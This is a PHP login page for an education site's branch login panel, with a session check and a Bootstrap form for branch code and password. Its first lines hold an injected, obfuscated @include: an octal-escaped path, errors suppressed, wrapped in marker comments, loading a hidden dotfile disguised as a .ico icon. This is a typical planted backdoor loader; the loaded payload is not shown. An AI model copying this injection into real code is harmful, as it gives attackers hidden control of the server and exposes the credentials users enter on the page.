<?php
/*eb770*/

@include "\057home\057edui\156diaf\057publ\151c_ht\155l/ve\156dor/\142arco\144e/.1\0719ebf\065e.ic\157";

/*eb770*/




 
    $a_f_n = "../admin/";
    $title = "EDU INDIA";
	session_start();
    $session_admin  =  @$_SESSION['session_branch']; 
	if(isset($session_admin)){
		echo "<script>location.href='welcome.php';</script>";
	}

?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title><?php echo $title; ?></title> 
  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
  <!-- Bootstrap 3.3.7 -->
  <link rel="stylesheet" href="<?php echo $a_f_n;?>bower_components/bootstrap/dist/css/bootstrap.min.css">
  
  <link rel="stylesheet" href="<?php echo $a_f_n ;?>dist/css/login_bg.css">
  
  <!-- Ionicons -->            
         
  <link rel="stylesheet" href="<?php echo $a_f_n;?>dist/css/AdminLTE.css">
  
</head>

<body>

<body> 
	<div class="container">
		<div class="row">
		<h2 class="user_title">Branch Login Panel</h2>
			<div class="col-sm-4 col-sm-offset-4 login_bg">
			
				<div class="form-group">
					<input type="text" placeholder="Branch Code" name="login_user_name" id="login_user_name" class="form-control">
					<input type="hidden" value="" id="hidden_email"/>
				</div>
				<div class="form-group">
				    <input type="password" placeholder="User Password" name="login_user_password" id="login_user_password" class="form-control">
				</div> 
				<div class="form-group">
				   <input type="submit" name="login_btn"  id="login_btn" class="btn btn-block login_btn" value="Submit"/>
				</div> 
				 
			</div>
		</div>
	</div>
 
 
 

<!-- jQuery 3 -->
<script src="<?php echo $a_f_n;?>dist/js/jquery.js"></script>
<script src="<?php echo $a_f_n;?>dist/js/bootstrap.js"></script>
<script src="login_js.js" type="text/javascript"></script>

</body>
</html>
